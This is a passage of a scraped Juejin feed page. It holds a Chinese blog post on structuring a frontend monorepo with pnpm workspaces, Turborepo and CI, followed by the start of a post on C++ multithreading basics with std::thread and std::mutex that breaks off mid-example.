TbSVk1PB62mhJ9HSpSqtKaESxsFRm0tLBVcvTV+vbBrLRK4hC7aitN9B0ZpX6vNMgjGIt5ZdmMv32KrmprD1afsPd4FEhThK0+WfTl3kpd482AGvG3jQdZK1+t8ireDswhofigRb3fxfI/4jj+xkffUX/1ccxxhEP9qyyBEH9Cx9vhf8TB7eiSpBHjZVSa4whQMJC1TqIR6q8RERtjOr2ID0yx3oYi0oAIvZCPz4eG64p3ObuREeOHUIR3MBVJwq9yll5P7KHdiPBOiOoRa/AjXz21J3k04l+i8OjErj4kaXWQiIVO/EvA+KLRAEnUVomtjPd6SvR3RLoeMT54nKFH1EqtkkEGFaQuTlSQrsxhRiOIt51S/Ho8B11+FUlwRaHnU4utEI38/mgSjRJ8PhWEtN6Z6WcncQOU4efjKoh3zfi7/+DfhPrwOZ9a/iYBiVJJxPlei3CqIDTYEqAPFow5/c71fAdVIwmo4n+cTIGbr2n9NULAE5ifcNNS63hvEOFk0wxYnICBBZ0I9xERBVILF0uggNdxuOkR4S6ngvgPmArzHv4KpMKGQFjQ+Rw6q9dC6R6dgZaJF7RVWIH0BTY9h+fz0ohHOyLuy+He/hN4GUR3/RxcBx2f76izarI9CaXmzRmhNQuSfIgJkva5GzN6HJbhQxCNsDGDSh56plmef6sg2eaXPsYBt5W+H6VE6omG6hOS1w4hiTWiThbJ1YO+RSO1vrpMlomf6nhQGz0m7qT6W04XOUHyzhZ4rkG+0hxL66oDW9mnPWyL3TMmssxyQUwr01CHX7b2OvUIaqS48TnMtAoEQTQixJeAlDfSiGmk/l8jpwIpTyFqOfeNIHWBooC036ERtUQp2tm/CKT5jjySbxTlvUVj2yhjvyWDVL3yfKRojXwLSEWUp7q0PBAKPp7m5YGoT3WH7wAZ1BeOywNZv3Gak/LIqriwxbQ5jaTcsEW1eb+FvoWo+zr5V/IUOvNtsapU2zJXSyj0xVB13sPfq0kkZA7dubIIKXIlJ8Cy7u+BN22RVcr+peOuxHdcBbA04FAVmEoEtO5vX55K4KVZS1QJvBBzU1rgUl8JapBNYIowLoZtD9NWRTWKqqe36L48BSz8QPH9epqqIDehlh2UuqocEmrdV7AvhuRoM74m80yeDIEX3ppreNN235FxV58DNjhswn5K8zK21+5ctjut6NmUIoy9tVvitnHr2VDM3ahtW8KQ/Vbsp9GGiWHfk8skyTSFz9/HdxhHe4uR/RxX/mG1SGXwypcDJNmCMfucZ/C1CuCQUbiBUDYbe7tiRkZX8GIat50d+wqR1fdN7ygGzrHrcN4kGFHK02cil5M6INgQVsvnNz77T5PqUFYJJInYmIBplJfP5On4eiOwYfhuCD44oLyYVs43rI1rk3H7usttzq8Qo3j84vavN9mOkAeuq8dHEd9NtCVKX51Oen+MM6IEYvz5StOehKLpIjD+nKU5AQWJpLizdB+1sb5LQvFRxbSJVGHmSdK/0WWaPguEYmcSJ68aWkK6rAw6jwSSCmrTWVHT96R7HwHANEgqybVJL+E2vE2q7Uu91Gr73SbbNUvZDtiOlCeIv4r/AI+0XUwz1lvcAAAAAElFTkSuQmCC");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"❝";top:8px;left:5px}.markdown-body blockquote:after{content:"❞";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🧩 一、为什么 2025 年还在谈 Monorepo？</h2>
<blockquote>
<p>“因为我们不只是写页面，我们在协调宇宙。”</p>
</blockquote>
<h3 data-id="heading-1">🌈 背景演进：</h3>
<ul>
<li><strong>2018 以前</strong>：前端项目分散，每个 repo 都是一个孤岛 🏝️。</li>
<li><strong>2019–2022</strong>：组件库复用开始流行，人们引入 Lerna / Yarn Workspaces。</li>
<li><strong>2023–2024</strong>：微前端 + PNPM Workspaces 成为主流，TurboRepo、Nx 攻城略地。</li>
<li><strong>2025</strong>：AI 自动化、CI/CD 智能化、跨端构建统一化的时代。<br/>
👉 一个 repo 管理多个平台，已经不只是趋势，而是刚需。</li>
</ul>
<p>举例，一个现代公司可能有以下前端资产：</p>
<pre><code class="hljs language-bash" lang="bash">/apps
  ├── web-admin-dashboard
  ├── mobile-react-native-app
  ├── desktop-electron-shell
/packages
  ├── ui-components
  ├── utils
  ├── config
  ├── shared-apis
/tools
  ├── scripts
  └── ai-automation
</code></pre>
<p>这些项目耦合而不乱，各自独立又共享底层逻辑。<br/>
一个提交，影响多个生态。让工程协同像调交响乐一样优雅 🎻。</p>
<hr/>
<h2 data-id="heading-2">🏗️ 二、核心理念：依赖统一 · 构建分层 · 模块自治</h2>
<p>要设计一个面向未来的 Monorepo，我们得明确三大原则：</p>
<h3 data-id="heading-3">1. <strong>依赖统一（Unified Dependency Graph）</strong></h3>
<p>使用 <code>pnpm</code> 或 <code>yarn berry</code> 实现 workspace 的扁平依赖管理。<br/>
核心思想是：</p>
<blockquote>
<p>所有模块共享依赖声明，但只在本地建立“引用符号链接”，避免重复安装。</p>
</blockquote>
<p><strong>推荐配置：</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">pnpm <span class="hljs-keyword">init</span>
pnpm install -w
pnpm <span class="hljs-keyword">add</span> typescript eslint prettier -w
</code></pre>
<p><code>package.json</code> 的结构 👇：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"@company/monorepo"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"workspaces"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-string">"apps/*"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-string">"packages/*"</span>
  <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"typescript"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.8.0"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"turbo"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^2.0.4"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"eslint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^9.0.1"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-4">2. <strong>构建分层（Layered Build System）</strong></h3>
<p>在 2025 年，你可以让 <strong>单个命令自动调度依赖构建链</strong> 💥。</p>
<p>例如使用 <strong>Turborepo</strong>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># turbo.json</span>
{
  <span class="hljs-string">"<span class="hljs-variable">$schema</span>"</span>: <span class="hljs-string">"https://turborepo.org/schema.json"</span>,
  <span class="hljs-string">"pipeline"</span>: {
    <span class="hljs-string">"build"</span>: {
      <span class="hljs-string">"dependsOn"</span>: [<span class="hljs-string">"^build"</span>],
      <span class="hljs-string">"outputs"</span>: [<span class="hljs-string">"dist/**"</span>]
    },
    <span class="hljs-string">"lint"</span>: {},
    <span class="hljs-string">"dev"</span>: {
      <span class="hljs-string">"cache"</span>: <span class="hljs-literal">false</span>
    }
  }
}
</code></pre>
<p>在任意子项目执行：</p>
<pre><code class="hljs language-arduino" lang="arduino">pnpm turbo run build
</code></pre>
<p>Turbo 会自动：</p>
<ul>
<li>跳过未变更模块；</li>
<li>并行执行独立任务；</li>
<li>缓存产物到远端（甚至可以进入 AI 编译缓存阶段，调用云 API 提速）。</li>
</ul>
<p>AI 实际用这种模式可在 30 秒内构建一个百模块前端仓库 🚀。</p>
<hr/>
<h3 data-id="heading-5">3. <strong>模块自治（Autonomous Module Design）</strong></h3>
<p>每个子包（package）应该自包含：</p>
<ul>
<li>自己的依赖；</li>
<li><code>tsconfig.json</code>;</li>
<li>测试与构建脚本；</li>
<li>与主仓库 ESLint、Prettier 一致的约束。</li>
</ul>
<p>例如 <code>/packages/ui-components/package.json</code>：</p>
<pre><code class="hljs language-perl" lang="perl">{
  <span class="hljs-string">"name"</span>: <span class="hljs-string">"@company/ui-components"</span>,
  <span class="hljs-string">"version"</span>: <span class="hljs-string">"1.0.0"</span>,
  <span class="hljs-string">"main"</span>: <span class="hljs-string">"dist/index.js"</span>,
  <span class="hljs-string">"scripts"</span>: {
    <span class="hljs-string">"build"</span>: <span class="hljs-string">"tsup src/index.ts --dts"</span>,
    <span class="hljs-string">"test"</span>: <span class="hljs-string">"vitest"</span>
  }
}
</code></pre>
<p>它既能作为独立 npm 包发布，也能被内部 app 实时引用。<br/>
这就是所谓 <strong>模块自治 + 内部共享生态</strong>。</p>
<hr/>
<h2 data-id="heading-6">🧠 三、灵魂武器：工具组合拳</h2>













































<table><thead><tr><th>工具</th><th>职责</th><th>备注</th></tr></thead><tbody><tr><td><strong>PNPM Workspaces</strong></td><td>快速管理多项目依赖</td><td>替代 Yarn Workspaces</td></tr><tr><td><strong>TurboRepo / Nx</strong></td><td>构建和缓存调度</td><td>Turbo 更轻量，Nx 更企业级</td></tr><tr><td><strong>ESBuild / Vite</strong></td><td>开发与构建</td><td>统一构建接口</td></tr><tr><td><strong>TypeScript Project References</strong></td><td>跨包 TS 类型共享</td><td>VSCode 智能推导</td></tr><tr><td><strong>Vitest / Playwright</strong></td><td>单元与端到端测试</td><td>一体化测试方案</td></tr><tr><td><strong>Changesets</strong></td><td>自动版本与发布日志管理</td><td>💡 Monorepo 宝藏</td></tr><tr><td><strong>AI Assistant (自研)</strong></td><td>自动生成 CI 配置、Doc 与代码检查</td><td>2025 新趋势！🤖</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-7">⚡ 四、实际项目结构：带电的架构树</h2>
<pre><code class="hljs language-csharp" lang="csharp">company-monorepo/
│
├── apps/
│   ├── web-dashboard/
│   │   ├── src/
│   │   ├── vite.config.ts
│   │   └── package.json
│   ├── mobile-rn/
│   └── electron-shell/
│
├── packages/
│   ├── ui-kit/
│   ├── hooks/
│   ├── api/
│   ├── config/
│   └── shared-types/
│
├── .husky/              <span class="hljs-meta"># 提交钩子</span>
├── turbo.json           <span class="hljs-meta"># 构建管控</span>
├── pnpm-workspace.yaml
└── tsconfig.<span class="hljs-keyword">base</span>.json
</code></pre>
<hr/>
<h2 data-id="heading-8">🧬 五、从零搭建命令摘要</h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 初始化 monorepo 框架</span>
pnpm init
pnpm install -D turbo typescript eslint prettier

<span class="hljs-comment"># 初始化构建缓存与脚本</span>
npx turbo init

<span class="hljs-comment"># 新建 package 与 app</span>
pnpm create vite apps/web-dashboard --template react-ts
pnpm create package packages/ui-kit

<span class="hljs-comment"># 关联开发</span>
pnpm add @company/ui-kit -F @company/web-dashboard
</code></pre>
<p>💡 <strong>Tip：</strong><br/>
使用 <code>-F</code> 指定 workspace，能保证关联时版本精准，不会“拉最新”。</p>
<hr/>
<h2 data-id="heading-9">🧑‍💻 六、2025 年的前端 CI/CD 革命</h2>
<p><strong>AI 工程辅助 + 云缓存 = Monorepo 飞起</strong></p>
<p>建议在 CI 管线中加入 AI 审查逻辑，例如：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .github/workflows/build.yml</span>
<span class="hljs-attr">jobs:</span>
  <span class="hljs-attr">build:</span>
    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span>
    <span class="hljs-attr">steps:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v4</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">pnpm/action-setup@v3</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">pnpm</span> <span class="hljs-string">install</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">pnpm</span> <span class="hljs-string">turbo</span> <span class="hljs-string">run</span> <span class="hljs-string">lint</span> <span class="hljs-string">build</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">run:</span> <span class="hljs-string">npx</span> <span class="hljs-string">ai-cli</span> <span class="hljs-string">check</span> <span class="hljs-string">code-quality</span> <span class="hljs-string">--mode</span> <span class="hljs-string">deep</span>
</code></pre>
<p>AI 可在此阶段执行：</p>
<ul>
<li>智能依赖剔除；</li>
<li>构建速度预测；</li>
<li>commit 语义检查；</li>
<li>自动修复潜在的"循环引用"问题。</li>
</ul>
<p>让代码像 Ferrari 一样流畅上路 🏎️。</p>
<hr/>
<h2 data-id="heading-10">🧘 七、哲学总结：Monorepo ≠ 巨大代码仓库</h2>
<p>Monorepo 不是“代码都堆一起”，而是：</p>
<blockquote>
<p>“一个逻辑上的星系，每个模块都是一颗恒星。”</p>
</blockquote>
<p>它的灵魂是<strong>统一协作、共享生态、分层构建、智能管理</strong>。<br/>
当你配合 AI 工具链、云缓存、项目引用机制，<br/>
整个前端团队的效率，将比肩量子传送般顺畅 ⚛️。</p>
<hr/>
<h2 data-id="heading-11">🪄 结语：2025，前端工程师的蜕变</h2>
<p>未来的前端不止是写 UI，而是建造整个信息生态的“系统工程”。</p>
<p>Monorepo 是这场蜕变的土壤；<br/>
AI 是新一代的开发同事；<br/>
而工程师，则是架构的诗人。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[每日一个C++知识点|多线程基础]]></title>    <link>https://juejin.cn/post/7581693431740350527</link>    <guid>https://juejin.cn/post/7581693431740350527</guid>    <pubDate>2025-12-09T16:47:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581693431740350527" data-draft-id="7581678032336961578" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="每日一个C++知识点|多线程基础"/> <meta itemprop="keywords" content="编程语言,C++"/> <meta itemprop="datePublished" content="2025-12-09T16:47:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="图形学爱好者_Wu"/> <meta itemprop="url" content="https://juejin.cn/user/1060359067408631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            每日一个C++知识点|多线程基础
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1060359067408631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    图形学爱好者_Wu
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T16:47:54.000Z" title="Tue Dec 09 2025 16:47:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>多线程开发场景基本是每一个C++开发工程师无法避免的场景,今天就带大家从零基础入门C++多线程编程,掌握其中的基础用法、锁管理工具和条件变量的内容</p>
<h2 data-id="heading-0">多线程的认识</h2>
<p>多线程就是一个程序内部运行多个任务,每个任务就是一个线程,充分利用CPU的资源,提高效率的技术</p>
<p>在多个线程中,作为程序入口的线程称为<code>主线程</code>,由主线程创建负责独立执行细分任务的线程称为<code>子线程</code></p>
<h2 data-id="heading-1">实现依赖</h2>
<p>在C++中想使用多线程技术,就要引入头文件<code>&lt;thread&gt;</code></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
</code></pre>
<h2 data-id="heading-2">线程创建基本流程</h2>
<p>首先要定义线程要执行的任务函数,然后要通过<code>std::thread</code>实例化线程对象并且绑定该任务函数,最后调用<code>join()</code>函数或者<code>detach()</code>函数</p>
<p>其中<code>join()</code>来阻塞主线程,等待子线程执行完毕;<code>detach()</code>来将主线程和子线程分离</p>
<p>代码示例如下</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>

<span class="hljs-comment">// 子线程任务函数</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">task</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>{
    cout &lt;&lt; <span class="hljs-string">"子线程执行任务，传入参数："</span> &lt;&lt; num &lt;&lt; endl;
}

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// 实例化thread对象并绑定任务，传入参数5</span>
    <span class="hljs-function">std::thread <span class="hljs-title">t</span><span class="hljs-params">(task, <span class="hljs-number">5</span>)</span></span>;
    
    <span class="hljs-comment">// 阻塞主线程，等待子线程执行完成</span>
    t.<span class="hljs-built_in">join</span>();
    
    std::cout &lt;&lt; <span class="hljs-string">"主线程继续执行"</span> &lt;&lt; std::endl;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>为什么要调用<code>join(</code>或<code>detach()</code>函数呢,如果不调用线程在对象析构时会触发程序异常终止</p>
<h2 data-id="heading-3">互斥锁</h2>
<p>当多个线程访问同一块共享内存时,会出现数据读写混乱的情况,这就是竞态条件,为了解决这个问题,可以采用互斥锁<code>std::mutex</code></p>
<p><code>std::mutex</code>的核心接口是<br/>
<code>lock()</code>,<code>unlock()</code>,<code>try_lock()</code></p>
<p><code>lock()</code>给互斥锁加锁，若锁已被其他线程持有，则当前线程会阻塞，直到获取到锁,必须确保只有持<code>unlock()</code>是释放锁,确保只有持有锁的线程才能调用,<code>try_lock()</code>是尝试加锁，成功返回true，失败返回false，不会阻塞当前线程</p>
<p>代码示例</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;thread&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mutex&gt;</span></span>

std::mutex mtx;  <span class="hljs-comment">// 定义全局互斥锁</span>
<span class="hljs-type">int</span> shared_counter = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 共享资源</span>

<span class="hljs-comment">// 子线程任务：对共享计数器进行累加</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">increment_counter</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
        mtx.<span class="hljs-built_in">lock</span>();  <span class="hljs-comment">// 加锁，进入临界区</span>
        shared_counter++;
        mtx.<span class="hljs-built_in">unlock</span>();  <span class="hljs-comment">// 解锁，退出临界区</span>
    }
}

